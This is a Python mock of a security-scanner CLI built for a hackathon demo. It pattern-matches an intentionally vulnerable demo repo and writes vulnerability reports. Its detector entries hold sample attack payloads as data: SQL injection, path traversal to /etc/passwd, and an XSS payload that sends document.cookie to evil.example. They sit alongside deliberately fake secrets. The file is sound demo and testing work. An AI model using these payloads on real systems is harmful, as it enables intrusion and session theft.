#!/usr/bin/env python3
"""Mock Strix CLI for the RepoRaid hackathon demo.

SIMULATED: this is NOT Strix. It mimics the Strix open-source CLI's interface
and artifact layout (strix_runs/<run-name>/{run.json, vulnerabilities.json,
findings.sarif, *.md}) so the rest of the pipeline can be built and demoed
without Docker or a scanner LLM key. Swap in the real `strix` binary by
running worker/run_scan.sh with STRIX_MOCK=0.

Detection is a handful of deterministic pattern checks against the
intentionally vulnerable demo repo, so re-scanning after a fix really does
report fewer findings. Like Strix, it exits nonzero (2) when it finds issues.

Usage (mirrors the Strix flags we use):
    python3 worker/mock_strix.py -n --target ./demo-vulnerable-repo \
        --scan-mode quick --max-budget 5 [--run-name NAME] [--out strix_runs]
"""
from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
import re
import subprocess
import sys
import time
from pathlib import Path

# Each detector: (source id, file, function, regex that indicates the bug, raw finding).
# Raw findings deliberately include fields the adapter must strip (poc, evidence
# with a fake secret, internal URL) to exercise sanitization.
DETECTORS = [
    {
        "id": "vuln-0001",
        "rule": "rr-sqli",
        "file": "src/handlers.js",
        "function": "findUser",
        "pattern": r"query\(\s*\"[^\"]*\"\s*\+|query\(\s*'[^']*'\s*\+|query\(\s*`[^`]*\$\{",
        "title": "SQL injection in user lookup",
        "severity": "critical",
        "cwe": "CWE-89",
        "description": "The `name` request parameter is concatenated directly into a SQL "
        "statement in findUser(), allowing an attacker to alter query logic.",
        "remediation": "Use parameterized queries (placeholders + bound parameter array) "
        "and add a regression test that asserts user input never appears in SQL text.",
        "poc": "GET /users?name=x'%20OR%20'1'='1  -> returns all rows",
        "evidence": "observed at http://10.0.4.12:3000/users with DB_PASSWORD=hunter2",
    },
    {
        "id": "vuln-0002",
        "rule": "rr-path",
        "file": "src/handlers.js",
        "function": "downloadFile",
        "pattern": r"path\.join\(FILES_DIR,\s*fileName\)(?![\s\S]{0,200}startsWith)",
        "title": "Path traversal in file download",
        "severity": "high",
        "cwe": "CWE-22",
        "description": "downloadFile() joins a user-controlled file name onto the download "
        "directory without checking the resolved path stays inside it.",
        "remediation": "Resolve the final path and refuse anything that does not start with "
        "the download directory (or reduce input to path.basename).",
        "poc": "GET /download?file=../../../../etc/passwd",
        "evidence": "read /etc/passwd from http://localhost:3000/download",
    },
    {
        "id": "vuln-0003",
        "rule": "rr-xss",
        "file": "src/handlers.js",
        "function": "renderSearch",
        "pattern": r"Results for \$\{q\}",
        "title": "Reflected XSS in search results",
        "severity": "medium",
        "cwe": "CWE-79",
        "description": "renderSearch() reflects the search term into HTML without encoding.",
        "remediation": "HTML-escape untrusted values before inserting them into markup.",
        "poc": "GET /search?q=<script>fetch('//evil.example/'+document.cookie)</script>",
        "evidence": "payload executed in headless browser session token=ghp_FAKEFAKEFAKEFAKE1234",
    },
    {
        "id": "vuln-0004",
        "rule": "rr-errleak",
        "file": "src/handlers.js",
        "function": "handleError",
        "pattern": r"err\.stack|error:\s*err\.message",
        "title": "Stack traces exposed in error responses",
        "severity": "low",
        "cwe": "CWE-209",
        "description": "handleError() returns the raw error message and stack trace to clients.",
        "remediation": "Log details server-side and return a generic error message.",
        "poc": "Trigger a DB error and read the stack in the JSON body",
        "evidence": "stack revealed /srv/app/src/db.js and password=hunter2",
    },
]

AGENT_LOG = [
    "Initializing sandbox (simulated — no Docker container started)",
    "Cloning snapshot of target into isolated workspace",
    "Recon agent: mapping routes and handlers",
    "Static agent: tracing untrusted input to sinks",
    "Validation agent: confirming exploitability in sandbox",
    "Reporting agent: writing artifacts",
]


def git_commit(target: Path) -> str:
    try:
        out = subprocess.run(
            ["git", "-C", str(target), "rev-parse", "HEAD"],
            capture_output=True, text=True, check=True,
        )
        return out.stdout.strip()
    except Exception:
        # Fall back to a content hash so the run is still pinned to an exact snapshot.
        h = hashlib.sha256()
        for p in sorted(target.rglob("*.js")):
            h.update(p.read_bytes())
        return "content-" + h.hexdigest()[:12]


def extract_function(source: str, name: str) -> tuple[int, str]:
    m = re.search(rf"^function {name}\(.*?^\}}", source, re.S | re.M)
    if not m:
        return 0, ""
    return source[: m.start()].count("\n") + 1, m.group(0)


def scan(target: Path) -> list[dict]:
    found = []
    for d in DETECTORS:
        path = target / d["file"]
        if not path.exists():
            continue
        src = path.read_text()
        line, body = extract_function(src, d["function"])
        if body and re.search(d["pattern"], body):
            found.append({**d, "line": line, "code": body})
    return found


def write_sarif(findings: list[dict], path: Path) -> None:
    sarif = {
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [{
            "tool": {"driver": {"name": "strix (simulated)", "rules": [
                {"id": f["id"], "name": f["title"], "properties": {"cwe": f["cwe"]}} for f in findings
            ]}},
            "results": [{
                "ruleId": f["id"],
                "level": "error" if f["severity"] in ("critical", "high") else "warning",
                "message": {"text": f["title"]},
                "locations": [{"physicalLocation": {
                    "artifactLocation": {"uri": f["file"]},
                    "region": {"startLine": f["line"]},
                }}],
            } for f in findings],
        }],
    }
    path.write_text(json.dumps(sarif, indent=2))


def main() -> int:
    ap = argparse.ArgumentParser(description="Mock Strix CLI (SIMULATED)")
    ap.add_argument("-n", "--non-interactive", action="store_true")
    ap.add_argument("--target", required=True)
    ap.add_argument("--scan-mode", default="quick")
    ap.add_argument("--max-budget", type=float, default=5)
    ap.add_argument("--run-name")
    ap.add_argument("--out", default="strix_runs")
    ap.add_argument("--fast", action="store_true", help="skip the simulated delays")
    args = ap.parse_args()

    target = Path(args.target).resolve()
    if not target.is_dir():
        print(f"error: target {target} is not a directory", file=sys.stderr)
        return 1

    started = dt.datetime.now(dt.timezone.utc)
    run_name = args.run_name or f"{target.name}_{started.strftime('%Y%m%d-%H%M%S')}"
    run_dir = Path(args.out) / run_name
    run_dir.mkdir(parents=True, exist_ok=True)

    print(f"[strix:SIMULATED] target={target.name} mode={args.scan_mode} budget=${args.max_budget}")
    for step in AGENT_LOG:
        print(f"[strix:SIMULATED] {step}")
        if not args.fast:
            time.sleep(0.4)

    findings = scan(target)
    commit = git_commit(target)
    spent = round(min(args.max_budget, 0.35 + 0.42 * len(findings)), 2)

    vulns = [{
        "id": f["id"],
        "title": f["title"],
        "severity": f["severity"],
        "cwe": f["cwe"],
        "description": f["description"],
        "remediation": f["remediation"],
        "location": {"file": f["file"], "line": f["line"], "function": f["function"]},
        "code_snippet": f["code"],
        "poc": f["poc"],
        "evidence": f["evidence"],
        "validated": True,
        "rule_hint": f["rule"],
    } for f in findings]
    (run_dir / "vulnerabilities.json").write_text(json.dumps(vulns, indent=2))
    write_sarif(findings, run_dir / "findings.sarif")
    for f in findings:
        (run_dir / f"{f['id']}.md").write_text(
            f"# {f['title']}\n\n**Severity:** {f['severity']}  \n**CWE:** {f['cwe']}\n\n"
            f"{f['description']}\n\n## Proof of concept\n\n```\n{f['poc']}\n```\n\n"
            f"## Remediation\n\n{f['remediation']}\n"
        )
    run = {
        "run_name": run_name,
        "simulated": True,
        "tool": "mock_strix.py",
        "target": target.name,
        "commit_sha": commit,
        "scan_mode": args.scan_mode,
        "max_budget": args.max_budget,
        "spent": spent,
        "status": "completed",
        "stop_reason": "finished",  # a real run may report a budget stop; the adapter checks this
        "started_at": started.isoformat(),
        "finished_at": dt.datetime.now(dt.timezone.utc).isoformat(),
        "vulnerability_count": len(findings),
    }
    (run_dir / "run.json").write_text(json.dumps(run, indent=2))

    print(f"[strix:SIMULATED] {len(findings)} validated finding(s); artifacts in {run_dir}")
    print(str(run_dir))
    return 2 if findings else 0


if __name__ == "__main__":
    sys.exit(main())
